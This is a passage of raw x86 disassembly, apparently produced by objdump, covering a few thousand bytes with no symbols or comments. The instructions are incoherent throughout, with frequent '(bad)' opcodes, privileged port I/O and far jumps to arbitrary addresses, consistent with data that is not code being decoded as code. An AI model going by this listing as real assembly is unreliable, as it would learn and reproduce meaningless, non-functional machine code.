  41ae29:	call   0xe537:0x9908b32d
  41ae30:	aad    0xe1
  41ae32:	sbb    eax,esi
  41ae34:	push   es
  41ae35:	pop    es
  41ae36:	fmul   DWORD PTR [ecx-0x45b983d1]
  41ae3c:	pushf  
  41ae3d:	cmp    eax,DWORD PTR [esi-0x38]
  41ae40:	ds pushf 
  41ae42:	and    BYTE PTR [edi-0x5716af9a],bl
  41ae48:	test   BYTE PTR [eax],bh
  41ae4a:	cld    
  41ae4b:	mov    dl,0x1c
  41ae4d:	mov    edi,0x86457c27
  41ae52:	dec    edi
  41ae53:	jl     0x41ae57
  41ae55:	lock mov bl,0xc2
  41ae58:	test   bl,al
  41ae5a:	inc    ecx
  41ae5b:	call   FWORD PTR [edx-0x4f]
  41ae5e:	mov    ebp,0x23157977
  41ae63:	imul   edi,DWORD PTR [ecx],0xdbfc43a6
  41ae69:	ins    DWORD PTR es:[edi],dx
  41ae6a:	jmp    0x78dec253
  41ae6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae70:	xchg   esi,eax
  41ae71:	js     0x41ae07
  41ae73:	lods   eax,DWORD PTR ds:[esi]
  41ae74:	and    DWORD PTR [ebp+0x3e],ebp
  41ae77:	sub    ch,bh
  41ae79:	and    al,0xd1
  41ae7b:	out    0x29,al
  41ae7d:	adc    dl,BYTE PTR [eax]
  41ae7f:	mov    dh,0x6c
  41ae81:	cmp    bl,BYTE PTR [edx]
  41ae83:	sub    DWORD PTR [edx+ecx*1-0x532286a],edx
  41ae8a:	xchg   DWORD PTR [esi-0x21d52c19],edi
  41ae90:	jne    0x41ae64
  41ae92:	jnp    0x41aefb
  41ae94:	inc    edx
  41ae95:	sbb    ch,BYTE PTR [edi-0x6]
  41ae98:	js     0x41ae2c
  41ae9a:	sub    DWORD PTR [edi],ebp
  41ae9c:	xchg   bl,al
  41ae9e:	rcl    ecx,1
  41aea0:	aas    
  41aea1:	in     al,0x2c
  41aea3:	fcmovb st,st(2)
  41aea5:	push   cs
  41aea6:	mov    bl,0xb6
  41aea8:	or     BYTE PTR [ebx],dl
  41aeaa:	jge    0x41af25
  41aeac:	loope  0x41ae38
  41aeae:	xor    BYTE PTR [edx+0x274f17b0],ch
  41aeb4:	(bad)  
  41aeb5:	lock dec ebp
  41aeb7:	jnp    0x41af15
  41aeb9:	adc    edx,ebp
  41aebb:	mov    esi,0x7c2c1074
  41aec0:	sti    
  41aec1:	daa    
  41aec2:	mov    eax,0xee9a4c0f
  41aec7:	cmp    dl,BYTE PTR [esi]
  41aec9:	sar    BYTE PTR [ebp+0x122fc641],1
  41aecf:	(bad)  [ebp+0x5f]
  41aed2:	inc    edx
  41aed3:	sbb    edi,ebx
  41aed5:	cdq    
  41aed6:	or     eax,DWORD PTR [edi-0x57b07df4]
  41aedc:	xchg   ecx,eax
  41aedd:	mov    ebp,DWORD PTR ds:0xc3dda52b
  41aee3:	paddsb mm0,QWORD PTR [edx]
  41aee6:	sahf   
  41aee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aee8:	xchg   edx,eax
  41aee9:	add    eax,0x9fe6753d
  41aeee:	scas   al,BYTE PTR es:[edi]
  41aeef:	jg     0x41af6d
  41aef1:	push   edx
  41aef2:	and    edi,ebp
  41aef4:	fcomp  DWORD PTR [edx]
  41aef6:	dec    esp
  41aef7:	stc    
  41aef8:	or     al,0x4
  41aefa:	add    al,BYTE PTR [ecx+0x35b85427]
  41af00:	and    bl,BYTE PTR [edx]
  41af02:	loope  0x41af1f
  41af04:	jecxz  0x41aec0
  41af06:	ins    BYTE PTR es:[edi],dx
  41af07:	xchg   edi,eax
  41af08:	sub    ah,BYTE PTR [ecx+edi*8]
  41af0b:	mov    esi,0x8414adb1
  41af10:	hlt    
  41af11:	push   esp
  41af12:	out    dx,eax
  41af13:	dec    ecx
  41af14:	inc    edx
  41af15:	dec    edi
  41af16:	inc    ebx
  41af17:	mov    eax,0x77f37bba
  41af1c:	retf   0xd641
  41af1f:	test   eax,0xb59a4dc4
  41af24:	les    ecx,FWORD PTR [ecx-0x18]
  41af27:	sub    al,0xbb
  41af29:	cmp    ecx,DWORD PTR [edi+0x7c]
  41af2c:	aam    0x5d
  41af2e:	xor    esp,DWORD PTR [esi-0x2b]
  41af31:	push   es
  41af32:	rcl    DWORD PTR [ebx+ecx*1-0xa],1
  41af36:	retf   0x6579
  41af39:	shr    DWORD PTR [edi],1
  41af3b:	adc    eax,0x1c1efa1c
  41af40:	rcl    DWORD PTR [ebp-0x10],0x59
  41af44:	iret   
  41af45:	sbb    eax,0xf7552d06
  41af4a:	mov    dl,0xac
  41af4c:	icebp  
  41af4d:	lods   eax,DWORD PTR ds:[esi]
  41af4e:	pushf  
  41af4f:	mov    al,ds:0x6c765860
  41af54:	fwait
  41af55:	test   al,dh
  41af57:	(bad)  
  41af59:	shl    bl,cl
  41af5b:	(bad)  
  41af5c:	mov    ds:0x401b90f4,al
  41af61:	jle    0x41aeed
  41af63:	or     esp,DWORD PTR [ebx]
  41af65:	in     eax,dx
  41af66:	xor    BYTE PTR [ebp-0x71],0xc1
  41af6a:	es push edi
  41af6c:	or     eax,0x8abdb827
  41af71:	mov    WORD PTR [ecx+0x50fcabe7],fs
  41af77:	cmp    ebx,DWORD PTR ds:0x53c98bf7
  41af7d:	mov    edx,0x159c8a73
  41af82:	fnsave [ebx-0x37252e15]
  41af88:	cmp    esp,0x4d
  41af8b:	jmp    0x41af25
  41af8d:	pop    eax
  41af8e:	adc    cl,BYTE PTR [ebx+0x24]
  41af91:	adc    dl,BYTE PTR [ebx+0x42497211]
  41af97:	mov    ecx,0x380d20c2
  41af9c:	iret   
  41af9d:	fs popa 
  41af9f:	add    BYTE PTR [esi+0x9],ah
  41afa2:	mov    bh,0x4a
  41afa4:	xchg   ebp,eax
  41afa5:	addr16 in eax,dx
  41afa7:	pop    edx
  41afa8:	int    0xf8
  41afaa:	jmp    0xdcd0:0x13bf6e68
  41afb1:	or     al,0x38
  41afb3:	dec    ecx
  41afb4:	or     esp,DWORD PTR [edi+0x27]
  41afb7:	xchg   ecx,eax
  41afb8:	test   DWORD PTR [ebx-0x54],edi
  41afbb:	cmp    BYTE PTR [eax],dl
  41afbd:	lods   eax,DWORD PTR ds:[esi]
  41afbe:	mov    eax,0x437e7a4c
  41afc3:	sbb    BYTE PTR [eax+0x33],bl
  41afc6:	xor    ch,BYTE PTR [edi+0xba61df]
  41afcc:	mov    cs,WORD PTR [esi-0x51]
  41afcf:	pop    edi
  41afd0:	pop    esi
  41afd1:	test   eax,0x49141346
  41afd6:	sbb    bl,bh
  41afd8:	pop    ebx
  41afd9:	inc    eax
  41afda:	aaa    
  41afdb:	or     eax,0xb9632b78
  41afe0:	fimul  WORD PTR es:[ecx]
  41afe3:	scas   al,BYTE PTR es:[edi]
  41afe4:	aad    0xba
  41afe6:	sti    
  41afe7:	add    DWORD PTR [ebx],esi
  41afe9:	mov    edi,DWORD PTR [eax-0xe26ec76]
  41afef:	imul   esi,DWORD PTR [eax-0x321213a],0xfc3d9d04
  41aff9:	mov    eax,ds:0xbb507e15
  41affe:	je     0x41afd3
  41b000:	mov    dh,0x68
  41b002:	push   edx
  41b003:	mov    ah,dh
  41b005:	in     eax,dx
  41b006:	repz in al,dx
  41b008:	xchg   ebx,eax
  41b009:	push   edx
  41b00a:	neg    WORD PTR [edx-0x6c]
  41b00e:	cdq    
  41b00f:	icebp  
  41b010:	fcom   QWORD PTR [edx+ecx*2+0x350e7c56]
  41b017:	test   DWORD PTR [eax-0x1b],ecx
  41b01a:	loope  0x41b01d
  41b01c:	and    ebx,DWORD PTR [esi]
  41b01e:	pop    esi
  41b01f:	add    al,0x30
  41b021:	dec    edx
  41b022:	inc    edx
  41b023:	dec    ebp
  41b024:	dec    edx
  41b025:	call   0x1e901f6a
  41b02a:	mov    edi,0x7520a5f9
  41b02f:	int3   
  41b030:	xor    BYTE PTR [ebp-0x66],bh
  41b033:	push   ebx
  41b034:	mov    ecx,0x534ebe46
  41b039:	fst    DWORD PTR [edx+eax*4+0x217137f1]
  41b040:	cmp    edx,ecx
  41b042:	mov    esi,DWORD PTR [eax]
  41b044:	mov    bl,0x82
  41b046:	adc    edx,esi
  41b048:	popf   
  41b049:	inc    edi
  41b04a:	xchg   esi,eax
  41b04b:	rol    BYTE PTR [esi+ebx*2+0x7f],1
  41b04f:	pop    ebx
  41b050:	or     al,0x2d
  41b052:	aaa    
  41b053:	loop   0x41afe0
  41b055:	rcr    ah,cl
  41b057:	mov    WORD PTR [edi],ds
  41b059:	or     al,0x78
  41b05b:	call   0x65fa:0x492a2c37
  41b062:	sub    eax,DWORD PTR [ecx-0x75]
  41b065:	pop    eax
  41b066:	stc    
  41b067:	rcr    BYTE PTR [esi+0x3575819e],0x6c
  41b06e:	int    0x18
  41b070:	mov    edx,0x4214134e
  41b075:	ret    0x52ce
  41b078:	cmp    DWORD PTR [esp+eiz*2-0x67],esi
  41b07c:	add    ch,BYTE PTR [esi+0x174ac688]
  41b082:	xchg   esp,eax
  41b083:	inc    edi
  41b084:	mov    ch,0x2d
  41b086:	pop    esp
  41b087:	arpl   WORD PTR [ecx-0x4bd01f88],ax
  41b08d:	jle    0x41b034
  41b08f:	in     eax,dx
  41b090:	lock mov cl,0x3e
  41b093:	loopne 0x41b0de
  41b095:	mov    ebp,0x8e93eb42
  41b09a:	imul   ebp,esi,0x5d98a38c
  41b0a0:	adc    BYTE PTR cs:[ecx],ah
  41b0a3:	push   eax
  41b0a4:	cmc    
  41b0a5:	xor    dl,dl
  41b0a7:	adc    BYTE PTR [ecx-0x2c],bl
  41b0aa:	push   0xffffff80
  41b0ac:	jae    0x41b116
  41b0ae:	jo     0x41b072
  41b0b0:	clc    
  41b0b1:	sub    DWORD PTR [ebx],ebp
  41b0b3:	into   
  41b0b4:	fadd   st(3),st
  41b0b6:	popa   
  41b0b7:	xor    al,0xa8
  41b0b9:	mov    eax,ds:0x94b74579
  41b0be:	retf   
  41b0bf:	dec    ebp
  41b0c0:	mov    WORD PTR [eax],?
  41b0c2:	sub    dl,dl
  41b0c4:	push   ecx
  41b0c5:	aad    0x93
  41b0c7:	inc    esi
  41b0c8:	push   ebp
  41b0c9:	ds mov cl,0xd4
  41b0cc:	and    ax,0x30b1
  41b0d0:	fistp  WORD PTR [ebx]
  41b0d2:	test   BYTE PTR [eax],dl
  41b0d4:	in     al,dx
  41b0d5:	div    DWORD PTR [ebx+0x1113dcc8]
  41b0db:	dec    ebx
  41b0dc:	sub    cl,dl
  41b0de:	dec    esi
  41b0df:	inc    DWORD PTR [edi+0x765c7c0b]
  41b0e5:	sti    
  41b0e6:	rep gs ins DWORD PTR es:[edi],dx
  41b0e9:	out    0xfc,al
  41b0eb:	in     al,dx
  41b0ec:	inc    edi
  41b0ed:	xchg   ecx,eax
  41b0ee:	ret    0x532a
  41b0f1:	and    cl,BYTE PTR [esi+edx*2]
  41b0f4:	jns    0x41b07c
  41b0f6:	push   es
  41b0f7:	mul    BYTE PTR [edi+eiz*4]
  41b0fa:	mov    ebx,0xc79f767b
  41b0ff:	sar    BYTE PTR [esi],cl
  41b101:	sbb    al,BYTE PTR [ebx]
  41b103:	sbb    eax,0x6b007bc7
  41b108:	dec    eax
  41b109:	or     BYTE PTR [edi-0x1127d981],dh
  41b10f:	pushf  
  41b110:	or     dh,BYTE PTR [ebx-0x4a166f8f]
  41b116:	inc    edx
  41b117:	inc    esp
  41b118:	xor    cl,BYTE PTR [ebx-0x66]
  41b11b:	mov    ebx,0xb48ee769
  41b120:	mov    edi,0xa996dcda
  41b125:	push   es
  41b126:	jbe    0x41b106
  41b128:	cmp    esp,DWORD PTR [eax]
  41b12a:	aad    0x1e
  41b12c:	xchg   ebx,eax
  41b12d:	mov    ds:0x9b93feac,al
  41b132:	add    eax,0x18a2ad99
  41b137:	mov    dl,0xce
  41b139:	push   ebp
  41b13a:	mov    eax,DWORD PTR [eax]
  41b13c:	mov    dh,0x56
  41b13e:	push   ecx
  41b13f:	sub    eax,0xbf61b691
  41b144:	outs   dx,DWORD PTR ds:[esi]
  41b145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b146:	std    
  41b147:	clc    
  41b148:	and    eax,0x6a
  41b14b:	cmc    
  41b14c:	cs or  bh,al
  41b14f:	(bad)  
  41b150:	mov    ecx,DWORD PTR [ecx+edx*8-0x6d158e89]
  41b157:	pop    esp
  41b158:	rcr    BYTE PTR [edi],cl
  41b15a:	fist   DWORD PTR [ebx]
  41b15c:	dec    ecx
  41b15d:	dec    ecx
  41b15e:	mov    esp,DWORD PTR ds:0x6504c0ca
  41b164:	xchg   DWORD PTR [ecx],esi
  41b166:	ficomp WORD PTR [ecx]
  41b168:	adc    ah,ch
  41b16a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b16b:	mov    esi,0x4b3f558f
  41b170:	pop    edx
  41b171:	out    dx,eax
  41b172:	imul   BYTE PTR [eax-0x6967ddb6]
  41b178:	mov    ecx,0x606ee02
  41b17d:	aaa    
  41b17e:	stc    
  41b17f:	mov    cl,0xb5
  41b181:	add    ebp,DWORD PTR es:[esi-0x4c]
  41b185:	test   al,0xca
  41b187:	loop   0x41b162
  41b189:	cmp    bh,BYTE PTR [ebp+ebx*4+0x36]
  41b18d:	dec    ecx
  41b18e:	mov    BYTE PTR [edi-0x59],ch
  41b191:	pop    esi
  41b192:	inc    eax
  41b193:	xchg   ebx,eax
  41b194:	in     al,dx
  41b195:	xchg   edx,eax
  41b196:	scas   eax,DWORD PTR es:[edi]
  41b197:	aam    0xc9
  41b199:	mov    ah,cl
  41b19b:	lds    edx,FWORD PTR [ebp+0x38]
  41b19e:	cmp    BYTE PTR [edi-0x5366f23d],dh
  41b1a4:	jecxz  0x41b20c
  41b1a6:	inc    edx
  41b1a7:	inc    ecx
  41b1a8:	dec    edx
  41b1a9:	int3   
  41b1aa:	fldenv [edi-0x785102ec]
  41b1b0:	push   0x1c
  41b1b2:	pop    es
  41b1b3:	repz jb 0x41b231
  41b1b6:	mov    eax,0xc37b5fbf
  41b1bb:	out    dx,al
  41b1bc:	daa    
  41b1bd:	out    0xc9,eax
  41b1bf:	inc    ebx
  41b1c0:	push   ds
  41b1c1:	shr    BYTE PTR [esi-0x6c4776b9],cl
  41b1c7:	or     edx,DWORD PTR [edx+0x15]
  41b1ca:	jnp    0x41b24b
  41b1cc:	pop    ebx
  41b1cd:	imul   ecx,DWORD PTR [eax+0x6afc79e5],0x28d79c7e
  41b1d7:	and    BYTE PTR ds:[ebp-0x5e],cl
  41b1db:	cmp    eax,0x39d04bcd
  41b1e0:	arpl   WORD PTR [edx+0x400d0860],ax
  41b1e6:	ja     0x41b1f0
  41b1e8:	nop
  41b1e9:	mov    bh,0x11
  41b1eb:	retf   
  41b1ec:	into   
  41b1ed:	sub    DWORD PTR [edi+0x14ee568c],eax
  41b1f3:	mov    esi,0xac6af691
  41b1f8:	dec    ebp
  41b1f9:	(bad)  
  41b1fa:	push   ecx
  41b1fb:	or     edi,DWORD PTR [esi]
  41b1fd:	pop    esp
  41b1fe:	push   edx
  41b1ff:	std    
  41b200:	cmp    bl,BYTE PTR [eax+0x29]
  41b203:	mov    dl,0xf5
  41b205:	jge    0x41b1b1
  41b207:	jmp    0x6c4f1a40
  41b20c:	ret    0x1821
  41b20f:	cmc    
  41b210:	pop    edx
  41b211:	(bad)  
  41b212:	dec    BYTE PTR [esi+edi*2]
  41b215:	mov    dl,BYTE PTR [ecx+0x5045094e]
  41b21b:	add    al,0x9d
  41b21d:	mov    ebp,0x4866fa07
  41b222:	and    BYTE PTR [ebx+0x410b38d0],bh
  41b228:	jle    0x41b226
  41b22a:	sub    dh,BYTE PTR [eax+eax*2-0x7ecdd839]
  41b231:	lock enter 0x3a8f,0x57
  41b236:	and    bl,cl
  41b238:	scas   eax,DWORD PTR es:[edi]
  41b239:	iret   
  41b23a:	pop    ebp
  41b23b:	hlt    
  41b23c:	dec    eax
  41b23d:	jl     0x41b22c
  41b23f:	xor    ebx,DWORD PTR [ecx-0x4e1f1e5]
  41b245:	es es push esp
  41b248:	mov    dh,BYTE PTR [ebx]
  41b24a:	lahf   
  41b24b:	dec    ebx
  41b24c:	and    eax,0xf4b10d8f
  41b251:	push   esi
  41b252:	inc    eax
  41b253:	into   
  41b254:	adc    BYTE PTR [ebp-0x44512790],0x4d
  41b25b:	xchg   esp,eax
  41b25c:	std    
  41b25d:	repnz int3 
  41b25f:	rcl    BYTE PTR [edx+0x18e18ecf],0x16
  41b266:	xchg   BYTE PTR [edi+0x336d7f93],cl
  41b26c:	out    dx,al
  41b26d:	clc    
  41b26e:	xor    eax,0xceb15555
  41b273:	sub    ch,cl
  41b275:	dec    ecx
  41b276:	loope  0x41b207
  41b278:	push   esp
  41b279:	ror    BYTE PTR [edi+0x4fc040b5],0x67
  41b280:	pop    esp
  41b281:	mov    ebx,0x8d17988c
  41b286:	xchg   ecx,eax
  41b287:	and    DWORD PTR [ecx],eax
  41b289:	pop    eax
  41b28a:	cdq    
  41b28b:	sub    al,0xa9
  41b28d:	adc    dh,BYTE PTR [ebx]
  41b28f:	jne    0x41b2a2
  41b291:	mov    ch,0xb6
  41b293:	cmp    esp,edx
  41b295:	mov    eax,ds:0xe131ac01
  41b29a:	mov    ebx,0x23268e89
  41b29f:	fs mov eax,0xe2c0073
  41b2a5:	and    edx,DWORD PTR cs:[edx+edi*8+0x68]
  41b2aa:	pop    ss
  41b2ab:	jle    0x41b246
  41b2ad:	fs mov ebp,0x6b69a61a
  41b2b3:	test   DWORD PTR [ecx+edx*4+0x30ed7c63],0x17fa0f3c
  41b2be:	mov    ah,0x28
  41b2c0:	mov    edx,0x9f6b9d17
  41b2c5:	pop    es
  41b2c6:	stos   DWORD PTR es:[edi],eax
  41b2c7:	(bad)  
  41b2c8:	fcomp  QWORD PTR [esp+0x22]
  41b2cc:	sbb    BYTE PTR [esi],bh
  41b2ce:	mov    dh,0x9
  41b2d0:	or     ebp,edx
  41b2d2:	js     0x41b34b
  41b2d4:	and    eax,0x74c90713
  41b2d9:	dec    eax
  41b2da:	test   DWORD PTR [edi+ecx*2+0x65f1ca5b],ebx
  41b2e1:	adc    BYTE PTR [ecx+ebx*4-0x59feef93],bl
  41b2e8:	fadd   st,st(0)
  41b2ea:	inc    eax
  41b2eb:	cmp    al,0x60
  41b2ed:	lock mov ebp,0xac1ad191
  41b2f3:	mul    ah
  41b2f5:	sbb    ah,BYTE PTR [ebp-0x3]
  41b2f8:	(bad)  
  41b2f9:	aad    0x63
  41b2fb:	or     eax,0xcf8add82
  41b300:	out    0xc6,al
  41b302:	mov    ebp,0xb9833abd
  41b307:	push   0xffffffb9
  41b309:	and    al,0x78
  41b30b:	jmp    FWORD PTR [eax-0x6c]
  41b30e:	xchg   ebx,eax
  41b30f:	jmp    0xf2ef:0x247a8410
  41b316:	(bad)  
  41b317:	jmp    0x6982:0x5606b04f
  41b31e:	daa    
  41b31f:	jg     0x41b35d
  41b321:	mov    ebp,0xd9fdd5df
  41b326:	mov    ds:0x354d404d,eax
  41b32b:	mov    ds:0x7c82cfa3,al
  41b330:	xchg   DWORD PTR [edx],ebp
  41b332:	xchg   ecx,eax
  41b333:	mov    cl,0x97
  41b335:	and    BYTE PTR [edx],cl
  41b337:	pop    eax
  41b338:	jo     0x41b2ca
  41b33a:	mov    al,0xbb
  41b33c:	adc    dh,0xf8
  41b33f:	mov    eax,0xf58c62f6
  41b344:	out    dx,eax
  41b345:	push   eax
  41b346:	pushf  
  41b347:	pop    eax
  41b348:	aam    0xa
  41b34a:	inc    ebx
  41b34b:	or     edx,DWORD PTR [ebx]
  41b34d:	out    0x90,al
  41b34f:	cmp    al,0xee
  41b351:	push   0x8c2f5316
  41b356:	scas   al,BYTE PTR es:[edi]
  41b357:	sar    DWORD PTR [ebp+eax*4-0x4cc990b1],1
  41b35e:	fidiv  DWORD PTR [eax-0x70bdd62f]
  41b364:	jle    0x41b3b5
  41b366:	arpl   di,ax
  41b368:	(bad)  
  41b369:	popf   
  41b36a:	cmp    edi,DWORD PTR [eax+0x1707a9f4]
  41b370:	lock idiv ebp
  41b373:	fidiv  DWORD PTR [ecx-0x67ab434f]
  41b379:	data16 mov al,0x53
  41b37c:	clc    
  41b37d:	shl    BYTE PTR [eax-0x3aff0746],cl
  41b383:	xlat   BYTE PTR ds:[ebx]
  41b384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b385:	cmp    esp,DWORD PTR [esi-0x15a94475]
  41b38b:	jmp    0xf6e8:0x377761e0
  41b392:	mov    ah,0xa3
  41b394:	ss cld 
  41b396:	sbb    esp,ecx
  41b398:	(bad)  
  41b399:	sbb    ebp,esp
  41b39b:	add    esp,DWORD PTR [esi-0x4cb5771e]
  41b3a1:	int3   
  41b3a2:	push   edi
  41b3a3:	xchg   ah,ch
  41b3a5:	jb     0x41b3e2
  41b3a7:	jge    0x41b3bc
  41b3a9:	pop    eax
  41b3aa:	inc    edi
  41b3ab:	jl     0x41b3e7
  41b3ad:	adc    ebx,esi
  41b3af:	push   esi
  41b3b0:	dec    esp
  41b3b1:	mov    cl,0xb
  41b3b3:	pop    eax
  41b3b4:	inc    esp
  41b3b5:	xor    edi,DWORD PTR [edi]
  41b3b7:	and    eax,DWORD PTR [ecx+0x53]
  41b3ba:	adc    dl,cl
  41b3bc:	loope  0x41b39f
  41b3be:	and    dh,BYTE PTR ds:0xb123bccf
  41b3c4:	pop    esp
  41b3c5:	cmp    ch,bh
  41b3c7:	es clc 
  41b3c9:	fnstenv [ebx+0x51495fa7]
  41b3cf:	sub    ah,BYTE PTR [ecx]
  41b3d1:	mov    dl,0xe1
  41b3d3:	in     al,0xcf
  41b3d5:	xchg   edx,eax
  41b3d6:	inc    eax
  41b3d7:	pushf  
  41b3d8:	mov    ebx,0x877abdd1
  41b3dd:	xchg   esp,eax
  41b3de:	out    dx,al
  41b3df:	outs   dx,DWORD PTR ds:[esi]
  41b3e0:	out    dx,al
  41b3e1:	push   edi
  41b3e2:	stos   BYTE PTR es:[edi],al
  41b3e3:	push   0x9b9090e9
  41b3e8:	mov    eax,0x1ac62d0d
  41b3ed:	adc    edi,esi
  41b3ef:	cmp    eax,0x880a1940
  41b3f4:	cmc    
  41b3f5:	cmp    BYTE PTR [edi+0x4a65efdb],dh
  41b3fb:	cwde   
  41b3fc:	dec    esp
  41b3fd:	cmp    eax,0x20ed6c52
  41b402:	dec    esp
  41b403:	sbb    ecx,DWORD PTR [eax+ebx*8+0x329fd151]
  41b40a:	xor    ebx,DWORD PTR [esi-0x16]
  41b40d:	int3   
  41b40e:	cdq    
  41b40f:	mov    ah,dh
  41b411:	pop    eax
  41b412:	leave  
  41b413:	and    edi,esi
  41b415:	bound  ebx,QWORD PTR [esi+eiz*1-0x473d623c]
  41b41c:	or     ebx,edi
  41b41e:	inc    edi
  41b41f:	cmp    ebp,DWORD PTR [ebp+0x35]
  41b422:	jp     0x41b43a
  41b424:	inc    esi
  41b425:	adc    ebx,DWORD PTR [ebp-0x12ad85c4]
  41b42b:	xor    DWORD PTR [ecx],edx
  41b42d:	cwde   
  41b42e:	xor    ah,ch
  41b430:	sbb    eax,ebp
  41b432:	int3   
  41b433:	push   ds
  41b434:	add    al,0x76
  41b436:	push   ss
  41b437:	nop
  41b438:	int    0xf7
  41b43a:	jl     0x41b44d
  41b43c:	js     0x41b3d4
  41b43e:	and    BYTE PTR [esi-0x16],dh
  41b441:	mov    bl,0x91
  41b443:	hlt    
  41b444:	mov    eax,0x8ff202b5
  41b449:	pop    edi
  41b44a:	cli    
  41b44b:	lods   eax,DWORD PTR ds:[esi]
  41b44c:	ds jg  0x41b498
  41b44f:	aam    0x48
  41b451:	das    
  41b452:	test   al,0x3c
  41b454:	push   ebx
  41b455:	in     eax,0x77
  41b457:	cwde   
  41b458:	xchg   al,dl
  41b45a:	cmp    al,0xe6
  41b45c:	sub    bh,BYTE PTR [eax+0x6f]
  41b45f:	adc    ch,BYTE PTR ds:0x1a6ae53f
  41b465:	adc    BYTE PTR [edx+0x70],al
  41b468:	pop    esp
  41b469:	mov    bh,0xa7
  41b46b:	mov    DWORD PTR ds:0xb7824f45,eax
  41b471:	aaa    
  41b472:	sbb    edx,DWORD PTR [edx-0x6b]
  41b475:	(bad)  
  41b476:	out    dx,al
  41b477:	out    0xc3,al
  41b479:	out    0xf7,eax
  41b47b:	fistp  DWORD PTR [edi-0x71]
  41b47e:	mov    ecx,DWORD PTR [eax]
  41b480:	inc    ebx
  41b481:	das    
  41b482:	dec    BYTE PTR [edi+0x6699e6a2]
  41b488:	loop   0x41b492
  41b48a:	ins    DWORD PTR es:[edi],dx
  41b48b:	sub    BYTE PTR [ebx-0x52],dh
  41b48e:	mov    ds,WORD PTR [eax+0x1dfb7f01]
  41b494:	xor    DWORD PTR [esp+ebx*1-0x74b1b604],ebp
  41b49b:	ja     0x41b49a
  41b49d:	(bad)  
  41b49e:	pop    esi
  41b49f:	push   esp
  41b4a0:	jl     0x41b472
  41b4a2:	out    0x5d,eax
  41b4a4:	sbb    esi,0x13838c0c
  41b4aa:	cmp    dh,bh
  41b4ac:	mov    bl,0x2f
  41b4ae:	imul   ebx
  41b4b0:	add    edx,0x6228dd93
  41b4b6:	out    0x25,eax
  41b4b8:	jl     0x41b4b1
  41b4ba:	das    
  41b4bb:	xchg   esi,edx
  41b4bd:	adc    BYTE PTR [ebp-0x6f63035f],bl
  41b4c3:	pop    esp
  41b4c4:	xor    esp,DWORD PTR [ebx]
  41b4c6:	xchg   ecx,eax
  41b4c7:	push   ds
  41b4c8:	daa    
  41b4c9:	mov    esi,0xc03ae890
  41b4ce:	aaa    
  41b4cf:	ins    DWORD PTR es:[di],dx
  41b4d1:	push   eax
  41b4d2:	or     BYTE PTR [esi],0xe6
  41b4d5:	xor    BYTE PTR [ebx+0xbb4ddc9],bh
  41b4db:	dec    edi
  41b4dc:	cmp    DWORD PTR [ebp+0x3e],0x9438c6db
  41b4e3:	bound  edx,QWORD PTR ds:0x93177aa6
  41b4e9:	mov    BYTE PTR [ebx+0x343b8f80],dh
  41b4ef:	add    al,0x7
  41b4f1:	and    al,0x3d
  41b4f3:	adc    al,0x61
  41b4f5:	leave  
  41b4f6:	lods   al,BYTE PTR ds:[esi]
  41b4f7:	(bad)  
  41b4f8:	jle    0x41b56e
  41b4fa:	dec    eax
  41b4fb:	aaa    
  41b4fc:	add    DWORD PTR gs:[ecx+edi*8],ecx
  41b500:	inc    esi
  41b501:	sbb    edi,esi
  41b503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b504:	cmp    BYTE PTR [esi+0x3a240005],bl
  41b50a:	pop    es
  41b50b:	test   eax,0x6d3dad91
  41b510:	ret    0xb2e1
  41b513:	test   BYTE PTR [eax+0x7759e8d7],ah
  41b519:	adc    ebx,ebx
  41b51b:	dec    edi
  41b51c:	pop    edi
  41b51d:	ret    
  41b51e:	add    BYTE PTR [ebp+0x58],0xc7
  41b522:	dec    eax
  41b523:	push   esi
  41b524:	fisub  DWORD PTR [edi]
  41b526:	dec    ebp
  41b527:	adc    BYTE PTR [esi+0x7d7f7e21],bh
  41b52d:	cdq    
  41b52e:	ret    
  41b52f:	adc    bl,0x17
  41b532:	fistp  WORD PTR [ebp-0x6748c103]
  41b538:	jnp    0x41b4f3
  41b53a:	push   esp
  41b53b:	setle  BYTE PTR [ebp-0x27ff97bb]
  41b542:	push   ds
  41b543:	repnz nop
  41b545:	sbb    dl,0xf4
  41b548:	inc    ebx
  41b549:	adc    BYTE PTR [eax],ch
  41b54b:	repnz inc ebx
  41b54d:	jb     0x41b4de
  41b54f:	ficomp WORD PTR [ecx+0x3b55220f]
  41b555:	pop    esp
  41b556:	xchg   ebx,eax
  41b557:	in     eax,0x23
  41b559:	add    BYTE PTR [ebp+0x3a7abf23],cl
  41b55f:	iret   
  41b560:	mov    eax,ds:0x53878127
  41b565:	out    dx,eax
  41b566:	mov    al,0x59
  41b568:	xchg   esi,eax
  41b569:	dec    ecx
  41b56a:	fld    QWORD PTR [eiz*4-0x71ef3303]
  41b571:	std    
  41b572:	cmp    DWORD PTR ds:0x8d4c619,ecx
  41b578:	cmp    bl,dh
  41b57a:	mov    ebx,0xd158c5ef
  41b57f:	enter  0x7d92,0x32
  41b583:	(bad)  
  41b584:	jmp    0x106e:0x764c805
  41b58b:	bound  edx,QWORD PTR [ebp+0x6c]
  41b58e:	or     eax,0x99a2750e
  41b593:	ja     0x41b53a
  41b595:	call   0x5bf2514f
  41b59a:	jg     0x41b589
  41b59c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b59d:	jns    0x41b54a
  41b59f:	ret    
  41b5a0:	jns    0x41b533
  41b5a2:	cmp    ebx,ecx
  41b5a4:	push   es
  41b5a5:	daa    
  41b5a6:	(bad)  
  41b5a7:	dec    DWORD PTR [eax+0xbc4d5ed]
  41b5ad:	scas   eax,DWORD PTR es:[edi]
  41b5ae:	repz adc DWORD PTR [ebp-0x2d],edx
  41b5b2:	pop    eax
  41b5b3:	outs   dx,DWORD PTR ds:[esi]
  41b5b4:	loop   0x41b630
  41b5b6:	push   ecx
  41b5b7:	push   cs
  41b5b8:	jle    0x41b552
  41b5ba:	pop    eax
  41b5bb:	pop    es
  41b5bc:	add    ch,BYTE PTR ds:0x643e0ed0
  41b5c2:	mov    bl,0x77
  41b5c4:	arpl   WORD PTR [edx+0x1a518c18],si
  41b5ca:	ret    
  41b5cb:	scas   eax,DWORD PTR es:[edi]
  41b5cc:	add    edx,ecx
  41b5ce:	add    cl,BYTE PTR [edx]
  41b5d0:	arpl   WORD PTR [edi+0x5e],bp
